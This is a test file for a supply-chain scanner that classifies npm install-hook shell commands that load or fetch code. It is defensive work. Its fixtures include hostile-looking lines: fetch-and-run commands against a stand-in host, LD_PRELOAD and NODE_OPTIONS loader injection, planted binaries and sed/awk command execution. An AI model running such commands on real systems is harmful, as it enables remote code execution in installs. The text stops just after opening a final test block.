import { describe, expect, test } from "bun:test";
import { flagBody, LIMITS, MAX_LEN, type ClassName } from "../src/shell-classes.ts";
import { prepass, type FileMap } from "../src/prepass.ts";

const classes = (body: string): ClassName[] => [...new Set(flagBody(body).map((h) => h.cls))].sort();
const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
// A hook body, a changed file the hook does not name, and whether the scan holds on it.
function held(cmd: string): boolean {
  const pj = JSON.stringify({ name: "x", version: "1", scripts: { postinstall: cmd } });
  const base = { "package.json": pj, "lib/setup.js": "1", "x.sh": "echo hi\n" };
  const h = prepass("npm", map(base), map({ ...base, "lib/setup.js": "evil()" })).hard.filter((s) => s.kind === "install-script");
  return h.length > 0;
}

describe("shell classes", () => {
  test("interpreter flags that load other code", () => {
    for (const c of ["node --loader ./l.mjs a.js", "node -r ./p.js a.js", "node --require=./p.js a.js", "node --import ./p.mjs a.js", "node --env-file .env a.js", "node --run setup", "python3 -m pkg.mod", "python3 -mpkg", "ruby -r ./x a.rb", "perl -MX a.pl", "php -f x.php", "bash --rcfile x.sh x.sh", "bash --init-file x.sh x.sh", "env FOO=1 node -r ./p.js a.js"]) {
      expect(classes(c), c).toEqual(["interp-flag"]);
    }
    for (const c of ["node a.js", "node --no-warnings a.js", "node -e 1", "node -p 1", "node --eval 1", "python3 -c 'print(1)'", "perl -e 'print 1'", "ruby -e 'p 1'", "python3 -u a.py", "sh -e a.sh", "bash a.sh -s -c"]) {
      expect(classes(c), c).toEqual([]);
    }
  });

  test("a program read from stdin", () => {
    for (const c of ["sh", "node -", "bash -s", "bash -s a.sh", "python3", "perl < x.pl", "sh < x.sh", "node 0<x.js", "sh -s -- x"]) expect(classes(c), c).toEqual(["interp-stdin"]);
    // a pipeline sink is read by the existing scan, not here
    for (const c of ["echo hi | sh", "cat x.sh | sh", "echo hi | python3 -c 'print(1)'"]) expect(classes(c), c).toEqual([]);
  });

  test("heredoc and here-string forms", () => {
    expect(classes("sh <<EOF\nnode a.js\nEOF\n")).toEqual(["heredoc"]);
    expect(classes("sh <<-'EOF'\n\tnode a.js\n\tEOF\n")).toEqual(["heredoc"]);
    expect(classes('sh <<"E"\nx\nE\n')).toEqual(["heredoc"]);
    expect(classes("sh <<< 'node a.js'")).toEqual(["heredoc"]);
    expect(classes("python3 <<EOF\nprint(1)\nEOF\n")).toEqual(["heredoc"]);
    expect(classes("node <<EOF\nx\n")).toEqual(["heredoc"]); // no terminator
    expect(classes("cat <<EOF\nhi\nEOF\n")).toEqual([]);
    expect(classes("cat <<EOF\n$(sh)\nEOF\n")).toEqual(["interp-stdin"]);
    expect(classes("cat <<'EOF'\n$(sh)\nEOF\n")).toEqual([]); // quoted delimiter: no expansion
    expect(classes("cat <<EOF\nhi\nEOF  \n")).toEqual(["heredoc"]); // a delimiter line with trailing blanks is not the end
  });

  test("a relative script after cd", () => {
    for (const c of ["cd sub && node a.js", "cd sub; sh run.sh", "pushd sub && ./run.sh", "cd .. && python3 a.py", "cd sub\nbash a.sh", "(cd sub && node a.js)"]) expect(classes(c), c).toEqual(["cd-relative"]);
    for (const c of ["cd sub && echo hi", "node a.js && cd sub", "cd sub && node /abs/a.js", "(cd sub) && node a.js"]) expect(classes(c), c).toEqual([]);
  });

  test("a file written or copied, then run", () => {
    for (const c of ["cat t > b.js && node b.js", "cp t.js b.js && node ./b.js", "mv t.js b.js; sh b.js", "echo x | tee run.sh; sh run.sh", "cat t >> ./r && ./r", "ln -s t b.js && node b.js"]) expect(classes(c), c).toEqual(["writer-exec"]);
    for (const c of ["cp t.js b.js && node a.js", "tar -xf v.tgz && node install.js", "node build.js 2>&1 | tee log.txt", "echo x > /dev/null && node a.js"]) expect(classes(c), c).toEqual([]);
  });

  test("a program held in a file", () => {
    for (const c of ["sed -f p.sed x", "sed -nf p.sed x", "awk -f p.awk x", "awk 'BEGIN{system(\"id\")}'", "make -f Mk", "make --file=Mk"]) expect(classes(c), c).toEqual(["program-file"]);
    for (const c of ["sed s/a/b/ x", "sed -i s/a/b/ x", "awk '{print $1}' x", "make", "make build"]) expect(classes(c), c).toEqual([]);
  });

  test("NODE_OPTIONS and npm_config_* assignments", () => {
    for (const c of ["NODE_OPTIONS=--require=./p.js node a.js", "npm_config_registry=http://x npm i", "env NODE_OPTIONS=-r./p node a.js", "export NODE_OPTIONS=-r./p", "NPM_CONFIG_X=1 npm run b", "FOO=1 npm_config_y=2 true", "sudo -E NODE_OPTIONS=x node a.js"]) {
      expect(classes(c), c).toEqual(["env-assign"]);
    }
    for (const c of ["FOO=1 node a.js", "export FOO=1", "env FOO=1 node a.js", "echo NODE_OPTIONS=x"]) expect(classes(c), c).toEqual([]);
  });

  test("nested bodies are read", () => {
    expect(classes("sh -c 'cd sub && node a.js'")).toEqual(["cd-relative"]);
    expect(classes("echo $(node -r ./p.js a.js)")).toEqual(["interp-flag"]);
    expect(classes("echo `make -f Mk`")).toEqual(["program-file"]);
    expect(classes('echo "$(sed -f p x)"')).toEqual(["program-file"]);
    expect(classes("(node -r ./p.js a.js)")).toEqual(["interp-flag"]);
  });

  test("an unclosed quote, backtick or paren reports nothing, an unterminated heredoc reports", () => {
    for (const c of ["node -r ./p.js 'a", "node -r ./p.js $(", "node -r ./p.js `a", "node -r ./p.js \"a", "echo a(b)", "node -p \\\"require('x').targets\\\""]) expect(classes(c), c).toEqual([]);
    expect(classes("sh <<")).toEqual(["heredoc"]);
  });

  test("structure the parser reads: case, functions, $'..', process substitution, stray parens", () => {
    const P = "node -r ./p.js a.js";
    for (const c of [`case x in *) ${P};; esac`, `case x in (a|b) ${P};; esac`, `f() { ${P}; }; f`, `function f { ${P}; }; f`, `function f() { ${P}; }`, `${P}; echo $'x\\'y'`, `${P}; : <(true)`, `: >(cat); ${P}`, `if true; then ${P}; fi`, `for i in a b; do ${P}; done`]) {
      expect(classes(c), c).toEqual(["interp-flag"]);
    }
    expect(classes("case x in *) node a.js;; esac")).toEqual([]);
  });

  test("a parse that gives up for structure fails closed with a named reason", () => {
    for (const c of [`echo $(echo $(echo $(echo $(echo $(node -r ./p.js a.js)))))`, "echo hi \\", "echo >"]) {
      expect(classes(c), c).toEqual(["unparsed"]);
    }
    expect(classes("echo $(echo $(echo $(echo $(node a.js))))")).toEqual([]); // depth 4 still reads
    const saved = LIMITS.fuel;
    try {
      LIMITS.fuel = 50;
      const hits = flagBody("echo " + "a ".repeat(100));
      expect(hits.map((h) => h.cls)).toEqual(["unparsed"]);
      expect(hits[0]!.why).toContain("budget");
    } finally { LIMITS.fuel = saved; }
  });

  test("many heredoc openers do not rescan: each search starts after the last terminator", () => {
    const t = performance.now();
    expect(classes("cat " + "<<E ".repeat(100) + "\n" + "\n".repeat(5000) + "E\n")).toEqual(["heredoc"]); // 100 openers, one terminator
    expect(classes("cat <<E\n".repeat(100) + "\n".repeat(5000) + "E\n")).toEqual([]); // one heredoc whose body holds the rest
    expect(classes("cat <<E <<E\na\nE\nb\nE\n")).toEqual([]);
    expect(performance.now() - t).toBeLessThan(100);
  });

  test("a heredoc, here-string or redirect into an interpreter with a flag", () => {
    for (const c of ["node --no-warnings <<E\nx\nE\n", "python3 -u <<E\nprint(1)\nE\n", "node --input-type=module <<< 'x'"]) expect(classes(c), c).toEqual(["heredoc"]);
    expect(classes("node --no-warnings < x.js")).toEqual(["interp-stdin"]);
    for (const c of ["node --version", "python3 --version", "node -e 1 < /dev/null", "node -v"]) expect(classes(c), c).toEqual([]);
  });

  test("clustered shell flags: -ec, -xc, -lc, -c --", () => {
    const P = "node -r ./p.js a.js";
    for (const c of [`bash -ec '${P}'`, `sh -xc '${P}'`, `bash -lc '${P}'`, `sh -c -- '${P}'`, `sh -c -e '${P}'`, `bash -o pipefail -c '${P}'`, `bash -c -o pipefail '${P}'`]) {
      expect(classes(c), c).toEqual(["interp-flag"]);
    }
    expect(classes("bash -ec 'echo hi'")).toEqual([]);
  });

  test("a cd and a written file carry into nested bodies", () => {
    expect(classes("cd sub && sh -c 'node a.js'")).toEqual(["cd-relative"]);
    expect(classes("cd sub && echo $(node a.js)")).toEqual(["cd-relative"]);
    expect(classes("cat t > b.js && sh -c 'node b.js'")).toEqual(["writer-exec"]);
    expect(classes("cat t > b.js && bash -lc 'node b.js'")).toEqual(["writer-exec"]);
    expect(classes("(cat t > b.js) && node b.js")).toEqual(["writer-exec"]);
    expect(classes("(cd sub) && sh -c 'node a.js'")).toEqual([]); // a cd inside a subshell does not leave it
    expect(classes("sh -c 'cd sub' && node a.js")).toEqual([]);
  });

  test("wrappers with option arguments", () => {
    const P = "node -r ./p.js a.js";
    for (const c of [`nice -n 5 ${P}`, `nice -5 ${P}`, `timeout -s KILL 10 ${P}`, `timeout 10 ${P}`, `timeout -k 5 -s TERM 10 ${P}`, `sudo -u root ${P}`, `sudo -E -u root -g wheel ${P}`, `env -u X ${P}`, `env -i A=1 ${P}`, `env -S '${P}'`, `xargs ${P}`, `xargs -n 1 -I{} ${P}`, `stdbuf -o0 ${P}`, `stdbuf -o L ${P}`, `setsid ${P}`, `arch -arm64 ${P}`, `builtin command nohup ${P}`, `ionice -c 3 ${P}`, `time -o t.log ${P}`, `exec -a x ${P}`, `nohup nice -n 5 timeout 9 ${P}`]) {
      expect(classes(c), c).toEqual(["interp-flag"]);
    }
    expect(classes("env -u X NODE_OPTIONS=--require=./p.js node a.js")).toEqual(["env-assign"]);
    expect(classes("env -C sub node a.js")).toEqual(["cd-relative"]);
    expect(classes("env --chdir=sub node a.js")).toEqual(["cd-relative"]);
    for (const c of ["nice -n 5 node a.js", "timeout -s KILL 10 node a.js", "sudo -u root node a.js", "xargs -n 1 echo"]) expect(classes(c), c).toEqual([]);
  });

  test("clustered interpreter flags", () => {
    for (const c of ["python3 -Bm pkg", "python3 -m pkg", "perl -wMFoo a.pl", "perl -wI lib a.pl", "ruby -wrfoo a.rb", "ruby -I lib a.rb"]) expect(classes(c), c).toEqual(["interp-flag"]);
    for (const c of ["python3 -Bu a.py", "perl -w a.pl", "ruby -w a.rb", "python3 -Bc 'print(1)'"]) expect(classes(c), c).toEqual([]);
  });

  test("a body over the character cap fails closed", () => {
    const long = "node a.js; " + "echo hi; ".repeat(MAX_LEN / 9);
    expect(long.length).toBeGreaterThan(MAX_LEN);
    expect(flagBody(long).map((h) => h.cls)).toEqual(["over-cap"]);
    expect(flagBody(long)[0]!.why).toContain(String(MAX_LEN));
    expect(flagBody("a".repeat(MAX_LEN))).toEqual([]);
    expect(classes("echo $(" + "a".repeat(MAX_LEN) + ")")).toEqual(["over-cap"]);
    expect(held(long)).toBe(true);
    expect(held("node a.js")).toBe(false);
  });

  test("a backslash or a variable in a flag, and a double-quoted -c string with $ or a backslash", () => {
    const P = "node -r ./p.js a.js";
    for (const c of ["node \\-r ./p.js a.js", "node $F a.js", "node ${F} a.js", "node $@ a.js", 'sh -c "node -r ./p.js a.js; echo \\$HOME"', 'sh -c "node -r ./p.js a.js; echo $HOME"', `sh -c "${P}; echo $(date)"`]) {
      expect(classes(c), c).toContain("interp-flag");
    }
    // a lone variable is the script, and a variable inside a longer word is not a flag
    for (const c of ["node $npm_package_config_bin", 'node "$X"', "node $DIR/a.js", "node a.js $F"]) expect(classes(c), c).toEqual([]);
  });

  test("heredoc bodies: $(..) spans, apostrophes, multi-line spans, arithmetic", () => {
    const P = "node -r ./p.js a.js";
    for (const c of [`cat <<E\nit's $(${P})\nE\n`, `cat <<E\n$(echo a\n${P})\nE\n`, `cat <<E\nx \`${P}\`\nE\n`, `cat <<-E\n\tit's $(${P}) and "q"\n\tE\n`, `echo $((1+$(${P})))`, `echo $[1+$(${P})]`, `cat <<E\n$((1+$(${P})))\nE\n`]) {
      expect(classes(c), c).toEqual(["interp-flag"]);
    }
    expect(classes("cat <<'E'\nit's $(node -r ./p.js a.js)\nE\n")).toEqual([]);
    expect(classes("cat <<E\nit's fine\nE\n")).toEqual([]);
    expect(classes("cat <<E\n$(node a.js\nE\n")).toEqual([]); // unclosed span: nothing to read
  });

  test("a backslash-escaped double quote inside a delimiter or a redirect target", () => {
    const P = "node -r ./p.js a.js";
    expect(classes(`cat > "a\\"b" && ${P}`)).toEqual(["interp-flag"]);
    expect(classes(`cat <<"E\\"OF"\nx\nE"OF\n; ${P}`)).toEqual(["interp-flag"]);
    expect(classes(`cat t > "a\\"b.js" && node 'a"b.js'`)).toEqual(["writer-exec"]);
  });

  test("interpreter flags with a separate value", () => {
    const P = "./p.js a.js";
    for (const c of [`python3 -W ignore -m pkg`, `python3 -X dev -m pkg`, `node --title foo -r ${P}`, `node -C dev -r ${P}`, `ruby -E utf-8 -r ./x a.rb`, `node --input-type module --require ${P}`, "php -d x=1 -f a.php", "deno run --config c.json a.ts", "node --test", "node --run setup"]) {
      expect(classes(c), c).toEqual(["interp-flag"]);
    }
    for (const c of ["node --title foo a.js", "python3 -W ignore a.py", "ruby -E utf-8 a.rb", "deno run a.ts", "deno eval 1", "deno task x", "node --input-type module a.js"]) expect(classes(c), c).toEqual([]);
    // the value of -r is not the script: a cd moves the script
    expect(classes("cd sub && node -r ./p.js a.js")).toEqual(["cd-relative", "interp-flag"]);
  });

  test("a file fetched or sourced, then run", () => {
    for (const c of ["curl -o b.js u && node b.js", "curl -ob.js u && node b.js", "curl --output b.js u && node b.js", "curl --output=b.js u; node b.js", "wget -O b.js u && node b.js", "wget -Ob.js u && node b.js", "wget --output-document=b.js u && node b.js", "cat t > r.sh && . ./r.sh", "cat t > r.sh && source r.sh"]) {
      expect(classes(c), c).toEqual(["writer-exec"]);
    }
    expect(classes("curl -s u | tar x && node a.js")).toEqual([]);
    expect(classes("node b.js > b.js")).toEqual([]); // the redirect empties b.js before node runs
    expect(classes("cat t > b.js; node b.js > b.js")).toEqual(["writer-exec"]);
  });

  test("more assignments that load code", () => {
    for (const c of ["BASH_ENV=./x.sh sh a.sh", "PERL5OPT=-Mx perl a.pl", "RUBYOPT=-rx ruby a.rb", "PYTHONPATH=. python3 a.py", "PYTHONSTARTUP=x python3 a.py", "NODE_PATH=. node a.js", "LD_PRELOAD=./x.so node a.js", "DYLD_INSERT_LIBRARIES=./x.dylib node a.js", "env PERL5LIB=. perl a.pl", "export LD_PRELOAD=./x.so"]) {
      expect(classes(c), c).toEqual(["env-assign"]);
    }
    expect(classes("PATH=$PATH:bin node a.js")).toEqual([]);
  });

  test("program files with attached values, and sed commands that run", () => {
    for (const c of ["make -fMk", "make -kf Mk", "sed -fp.sed x", "sed -nfp.sed x", "awk -fp.awk x", "sed '1e id' x", "sed 'e' x", "sed -e '$e id' x", "sed 's/a/b/e' x", "sed -n '/x/e echo'", "sed 's#a#b#ge' x"]) {
      expect(classes(c), c).toEqual(["program-file"]);
    }
    for (const c of ["sed 's/a/b/g' x", "sed -n '1p' x", "sed 's/e/f/' x", "sed '/e/d' x", "awk -F: '{print $1}' x", "make -j4"]) expect(classes(c), c).toEqual([]);
  });

  test("no false hold: a pipe then a newline, CRLF heredocs, $[..], ((..))", () => {
    for (const c of ["echo x |\nsh", "echo x | \n  sh", "cat <<E\r\nhi\r\nE\r\n", "echo $[1<<2]", "echo $((1<<2))", "((x=1<<2)); node a.js", "(( i = 1 << 2 ))"]) expect(classes(c), c).toEqual([]);
    expect(classes("cat <<E\r\nhi\r\n")).toEqual(["heredoc"]); // still unterminated
    expect(classes("sh <<E\r\nx\r\nE\r\n")).toEqual(["heredoc"]);
    expect(classes("((x=1<<2)); sh")).toEqual(["interp-stdin"]);
    expect(classes("((x=$(sh -c 'cd a && node b.js')))")).toEqual(["cd-relative"]);
  });

  test("a syntax error on a later line leaves the complete lines before it classified", () => {
    const L = "node --loader ./l.mjs a.js";
    for (const c of [`${L}\necho a(b)`, `${L}\necho 'x`, `${L}\n: "x'`, `${L}\necho $(`, `${L}\n${L}\necho \`x`, `echo hi\n${L}\necho a(b)\n${L}`]) expect(classes(c), c).toEqual(["interp-flag"]);
    // the line with the error is not read, and neither is anything after it; one line reports nothing
    expect(classes(`echo a(b)\n${L}`)).toEqual([]);
    expect(classes(`${L}; echo a(b)`)).toEqual([]);
    expect(classes(`${L}; echo 'x`)).toEqual([]);
    expect(classes(`${L}\n${L} 'x\n`)).toEqual(["interp-flag"]);
    expect(held(`${L}\necho a(b)`)).toBe(true);
    expect(held("echo a(b)")).toBe(false);
  });

  test("valid one-line shell the parser reads: expansions in redirect targets, arrays, [[ ]], comments, escaped quotes", () => {
    const P = "node -r ./p.js a.js";
    for (const c of [`${P} > $(echo log)`, `${P} > \`echo log\``, `${P} 2> "$(echo log)"`, `arr=(x y); ${P}`, `arr=($(echo x)); ${P}`, `[[ a =~ (a) ]] && ${P}`, `[[ -n $(true) ]] && ${P}`, `if [[ a == b* ]]; then ${P}; fi`, `echo $(true # it's\n); ${P}`, `echo $(cat <<E\nit's\nE\n); ${P}`, `echo $(cat <<-'E'\n\tit's\n\tE\n); ${P}`, `echo "x\\"y"; ${P}`, `echo "a \\" b" && ${P}`]) {
      expect(classes(c), c).toEqual(["interp-flag"]);
    }
    expect(classes("arr=($(sh -c 'cd a && node b.js'))")).toEqual(["cd-relative"]);
    expect(classes("[[ $(sh -c 'cd a && node b.js') ]]")).toEqual(["cd-relative"]);
    expect(classes("echo > $(sh -c 'cd a && node b.js')")).toEqual(["cd-relative"]);
  });

  test("a backslash only quotes: \\node, \\cd, node -\\r", () => {
    for (const c of ["\\node -r ./p.js a.js", "no\\de -r ./p.js a.js", "node -\\r ./p.js a.js", "node --\\loader ./l.mjs a.js"]) expect(classes(c), c).toEqual(["interp-flag"]);
    expect(classes("\\cd sub && node a.js")).toEqual(["cd-relative"]);
    expect(classes("c\\d sub && node a.js")).toEqual(["cd-relative"]);
    expect(classes("sh -c \"cd $INIT_CWD/sub && node a.js\"")).toEqual(["cd-relative"]);
    expect(classes("sh -c \"cd $INIT_CWD/sub && node -r ./p.js a.js\"").sort()).toEqual(["cd-relative", "interp-flag"]);
    expect(classes("\\node a.js")).toEqual([]);
  });

  test("flags after inline code or a separate-value flag still load code", () => {
    for (const c of ["node -e 1 -r ./p.js", "node -p 1 --require ./p.js", "node --eval 1 --import ./p.mjs", "perl -e 1 -MEvil", "perl -e 1 -I lib", "ruby -e 1 -r ./x", "python3 -W ignore -m evil", "python3 -X dev -m evil", "node --title x -r ./p.js a.js", "node -C dev -r ./p.js a.js"]) {
      expect(classes(c), c).toEqual(["interp-flag"]);
    }
    for (const c of ["node -e 1", "node -e 1 a b", "perl -e 1 a", "python3 -c 'print(1)' -m x", "node -C dev a.js"]) expect(classes(c), c).toEqual([]);
  });

  test("a written file run by the name node resolves, or from a directory the body wrote", () => {
    for (const c of ["cat t > b.js && node b", "cat t > index.js && node .", "cat t > index.js && node ./", "cp t b.mjs && node ./b", "mkdir lib && cp -r t lib && node lib/x.js", "cp -r t lib && node lib/x.js", "cat t > lib/index.js && node lib", "cat t > lib/package.json && node lib"]) {
      expect(classes(c), c).toEqual(["writer-exec"]);
    }
    for (const c of ["cat t > b.js && node c", "cat t > lib2/x.js && node lib/x.js", "cp t library && node lib/x.js", "tar -xf v.tgz && node install.js"]) expect(classes(c), c).toEqual([]);
  });

  test("integration: a flagged body reads files the hook does not name", () => {
    for (const c of ["node --loader ./l.mjs lib/other.js", "node -r ./nope.js a.js", "python3 -m pkg", "sh <<EOF\nnode a.js\nEOF", "cd sub && node a.js", "cat t > b.js && node b.js", "sed -f p.sed x", "NODE_OPTIONS=--require=./p.js node a.js"]) {
      expect(held(c), c).toBe(true);
    }
    for (const c of ["node a.js", "node -e 1", "node a.js && echo hi"]) expect(held(c), c).toBe(false);
  });
});

describe("shell classes: review part 2", () => {
  test("gawk, mawk and nawk are awk", () => {
    expect(classes("gawk -f x.awk a")).toEqual(["program-file"]);
    expect(classes("mawk 'BEGIN{system(\"id\")}' a")).toEqual(["program-file"]);
    expect(classes("nawk -f x.awk a")).toEqual(["program-file"]);
  });
  test("eval runs its joined words as shell", () => {
    expect(classes("eval node -r ./p.js a.js")).toEqual(["interp-flag"]);
    expect(classes("eval 'node -r ./p.js a.js'")).toEqual(["interp-flag"]);
    expect(classes("eval echo hi")).toEqual([]);
  });
  test("coproc runs the command behind it", () => {
    expect(classes("coproc node -r ./p.js a.js")).toEqual(["interp-flag"]);
  });
  test("a command substitution in a here-string or redirect target is walked", () => {
    expect(classes('cat <<< "$(node -r ./p.js a.js)"')).toEqual(["interp-flag"]);
    expect(classes("cat <<< $(node -r ./p.js a.js)")).toEqual(["interp-flag"]);
    expect(classes('echo > "$(node -r ./p.js a.js)"')).toEqual(["interp-flag"]);
    expect(classes('echo >& "$(node -r ./p.js a.js)"')).toEqual(["interp-flag"]);
    expect(classes("echo hi > \"$(echo log)\"")).toEqual([]);
  });
  test("more than 8 wrappers fails closed", () => {
    expect(classes("nohup ".repeat(9) + "node -r ./p.js a.js")).toEqual(["unparsed"]);
    expect(classes("nohup ".repeat(8) + "node -r ./p.js a.js")).toEqual(["interp-flag"]);
  });
  test("env - is an empty environment, not the command", () => {
    expect(classes("env - node -r ./p.js a.js")).toEqual(["interp-flag"]);
  });
  test("a ../ command after a cd is not the package's", () => {
    expect(classes("cd a/b && ../c.sh")).toEqual(["cd-relative"]);
    expect(classes("../c.sh")).toEqual([]);
  });
});

describe("shell classes: review part 3", () => {
  test("an empty &> target fails closed like > and <", () => {
    expect(classes("echo hi &>; node a.js")).toEqual(["unparsed"]);
    expect(classes("echo hi &> /dev/null; node a.js")).toEqual([]);
  });
  test("an assignment after env -- is checked", () => {
    expect(classes("env -- NODE_OPTIONS=-r./p.js node a.js")).toEqual(["env-assign"]);
    expect(classes("env -- FOO=1 node a.js")).toEqual([]);
  });
  test("prose with parens and an escaped backtick in a heredoc or word still finds the substitution", () => {
    expect(classes("cat <<EOF\nUsage: (foo) $(node -r ./p.js a.js)\nEOF")).toEqual(["interp-flag"]);
    expect(classes("echo \\`a $(node -r ./p.js a.js)")).toEqual(["interp-flag"]);
    expect(classes('echo "a\\`b\\`" $(node -r ./p.js a.js)')).toEqual(["interp-flag"]);
  });
  test("nested substitutions stay linear in the body length", () => {
    let inner = "echo a";
    for (let d = 0; d < 5; d++) inner = "echo $(" + inner + " ; " + "echo b ".repeat(300) + ")";
    const t = performance.now(); flagBody(inner); flagBody("cat <<EOF\n" + "$(echo $(echo $(echo $(echo x))))\n".repeat(550) + "EOF");
    expect(performance.now() - t).toBeLessThan(500);
  });
});

describe("shell classes: review of fcdb6a0", () => {
  const F: ClassName[] = ["interp-flag"];
  test("one budget for the whole call: a body of many unclosed quote lines fails closed and fast", () => {
    const t = performance.now();
    expect(classes("'" + "\n''".repeat(6600))).toEqual(["unparsed"]);
    expect(performance.now() - t).toBeLessThan(200);
  });
  test("writes of an earlier stage are known to the substitutions and subshells of the next", () => {
    expect(classes("cat evil > b.js && (node b.js)")).toEqual(["writer-exec"]);
    expect(classes("cat t > b.js; echo $(node b.js)")).toEqual(["writer-exec"]);
  });
  test("((..)) is read as arithmetic only when it is", () => {
    expect(classes("((true) && (node -r ./evil.js a.js))")).toEqual(F);
    expect(classes("((node -r ./evil.js a.js))")).toEqual(F);
    expect(classes("echo $(( (1) && (node -r ./evil.js a.js) ))")).toEqual(F);
    expect(classes("(( x = (1 + 2) * 3 )); node a.js")).toEqual([]);
  });
  test("valid bash the parser used to stop on", () => {
    for (const c of ["declare -a a=(1)", "local -a a=(1)", "export a=(1)", "time [[ a =~ (b) ]]", "[[ a == \" ]] \" ]]", "echo `echo \\`date\\``", "echo > $'a\\'b'", 'echo > "$(echo "x")"', "echo $(# it's\ncat <<EOF\nx\nEOF\n)", "echo $( echo $(( 1 << 2 )) )", "case x in @(a)) echo;; esac", "cmd &>> log", "while read x; do :; done < <(cmd)", "echo > >(cmd)"]) {
      expect(classes(c + "; node -r ./p.js a.js"), c).toEqual(F);
      expect(classes(c), c).toEqual([]);
    }
  });
  test("a word that expands before the script can hold a flag", () => {
    for (const c of ["set -- -r ./evil.js; node $1 $2 a.js", "node ${F:--r} ./evil.js a.js", "node $(printf -- -r) ./evil.js a.js", 'A=(-r ./evil.js); node "${A[@]}" a.js']) expect(classes(c), c).toEqual(F);
  });
  test("a shell reading a file by redirect is not a pipeline sink", () => {
    expect(classes("true | sh < evil.sh")).toEqual(["interp-stdin"]);
    expect(classes("true | sh")).toEqual([]);
  });
  test("a command this body wrote, run by path", () => {
    for (const c of ["cp evil node && ./node a.js", "cp evil sh && ./sh a.js", "cp evil env && ./env node a.js"]) expect(classes(c), c).toEqual(["writer-exec"]);
  });
  test("sed: -e, --expression, richer addresses, and a script past the cap", () => {
    for (const c of ["sed -e's/x/id/e' f", "sed --expression='e id' f", "sed --expression='e id' f", "sed '1~2e id' f", "sed '/x/I e id' f", "sed '1,+2e id' f", "sed '" + "p;".repeat(2100) + "' f"]) expect(classes(c), c).toEqual(["program-file"]);
    expect(classes("sed -e 's/a/b/' f")).toEqual([]);
  });
  test("fetched and copied files", () => {
    for (const c of ["curl -fsSLo b.js http://x.invalid/x && node b.js", "curl -O http://x.invalid/b.js && node b.js", "wget http://x.invalid/b.js && node b.js", "cp evil.js lib/ && node lib/evil.js", "cat t > ././b.js && node b.js"]) expect(classes(c), c).toEqual(["writer-exec"]);
  });
  test("a backslash-newline inside double quotes is removed", () => {
    expect(classes('node -r "./p.\\\njs" a.js')).toEqual(F);
  });
  test("clustered inline flags do not hide later loaders; php ini, lua -l, bun flags, more valued flags", () => {
    for (const c of ["perl -le 1 -MEvil", "ruby -we 1 -r./evil", "php -d auto_prepend_file=./e.php a.php", "php -dauto_prepend_file=./e.php a.php", "lua -l evil a.lua", "bun -c ./x a.js", "bun --cwd sub a.js", "bun run --preload ./p.js a.js", "node --unhandled-rejections strict -r ./evil.js a.js", "env --split-string='node -r ./p.js a.js'"]) expect(classes(c), c).toEqual(F);
    expect(classes("deno run --cached-only a.ts")).toEqual([]);
    expect(classes("php -d memory_limit=1G a.php")).toEqual([]);
  });
  test("gawk -i/-l, export NAME, and more loader variables", () => {
    expect(classes("gawk -i inc a.awk")).toEqual(["program-file"]);
    for (const c of ["export NODE_OPTIONS", "PATH=./bin:$PATH node a.js", "HOME=. zsh a.sh", "LUA_INIT=@x lua a.lua", "PERLLIB=. perl a.pl"]) expect(classes(c), c).toEqual(["env-assign"]);
    for (const c of ["PATH=$PATH:/usr/bin node a.js", "HOME=/tmp node a.js", "export PATH"]) expect(classes(c), c).toEqual([]);
  });
});

describe("shell classes: computed command word", () => {
  test("a command word that is an expansion can be any interpreter", () => {
    for (const c of ["$N -r ./p.js a.js", "${N} -r ./p.js a.js", "N=node; $N -r ./p.js a.js", "N=node\n$N -r ./p.js a.js", "x=1 $N a.js", "$(echo node) -r ./p.js a.js", "`echo node` -r ./p.js a.js", '"$N" a.js', "env $N a.js", "nohup $N a.js"]) {
      expect(classes(c), c).toEqual(["computed-command"]);
    }
    for (const c of ["echo $N", "node $N", "FOO=$N node a.js", "cat $(echo a)"]) expect(classes(c), c).toEqual([]);
  });
});

describe("shell classes: review of d2f6ddd", () => {
  const F: ClassName[] = ["interp-flag"];
  test("a for ((;;)) loop and time -p [[ ]] are read", () => {
    expect(classes("for ((i=0;i<1;i++)); do node --loader ./l.mjs a.js; done")).toEqual(F);
    expect(classes("time -p [[ a =~ (b) ]]; node -r ./p.js a.js")).toEqual(F);
    expect(classes("for ((i=0;i<1;i++)); do echo $i; done")).toEqual([]);
  });
  test("a clustered -o on a shell takes its value", () => {
    expect(classes("cat t > a.sh && bash -euo pipefail a.sh")).toEqual(["writer-exec"]);
    expect(classes("cat t > a.sh && bash +o errexit a.sh")).toEqual(["writer-exec"]);
  });
  test("node options with a separate value", () => {
    for (const f of ["--cpu-prof-dir x", "--heap-prof-dir x", "--report-filename x", "--max-http-header-size 9"]) expect(classes(`cat t > b.js && node ${f} b.js`), f).toEqual(["writer-exec"]);
  });
  test("an unknown node option followed by a non-script word and another word hits", () => {
    expect(classes("node --some-new-flag x b.js")).toEqual(F);
    for (const c of ["node --no-warnings a.js", "node --some-new-flag b.js", "node --some-new-flag=x b.js", "node --some-new-flag x", "node --cpu-prof-dir x b.js", "node --f0 1 --f1 1 -e 1"]) expect(classes(c), c).toEqual([]);
  });
  test("more loaders: node config and openssl files, and their variables", () => {
    expect(classes("node --experimental-config-file=./c.json a.js")).toEqual(F);
    expect(classes("node --openssl-config=./o.cnf a.js")).toEqual(F);
    for (const c of ["OPENSSL_CONF=./o.cnf node a.js", "PHP_INI_SCAN_DIR=. php a.php", "PHPRC=. php a.php", "GCONV_PATH=. node a.js", "LD_AUDIT=./x.so node a.js"]) expect(classes(c), c).toEqual(["env-assign"]);
  });
  test("an in-place edit writes the file that is then run", () => {
    expect(classes("sed -i 's/^/x/' a.js && node a.js")).toEqual(["writer-exec"]);
    expect(classes("sed -i -e 's/^/x/' a.js && node a.js")).toEqual(["writer-exec"]);
    expect(classes("perl -pi -e 1 a.js && node a.js")).toEqual(["writer-exec"]);
    expect(classes("sed -i 's/^/x/' a.txt && node a.js")).toEqual([]);
  });
  test("a lookup or a version query is not a program read from stdin", () => {
    for (const c of ["command -v node >/dev/null 2>&1 && node a.js", "command -v python3 >/dev/null || exit 0", "command -V node", "bash --version", "php -m", "php -i", "python3 -VV"]) expect(classes(c), c).toEqual([]);
    expect(classes("command node")).toEqual(["interp-stdin"]);
  });
  test("clustered inline code is code, not a script file", () => {
    expect(classes("cd sub && python3 -Bc 'x'")).toEqual([]);
    expect(classes("python3 -Bc 'x' -m y")).toEqual([]);
  });
});

describe("shell classes: review of 9d585ae", () => {
  const F: ClassName[] = ["interp-flag"];
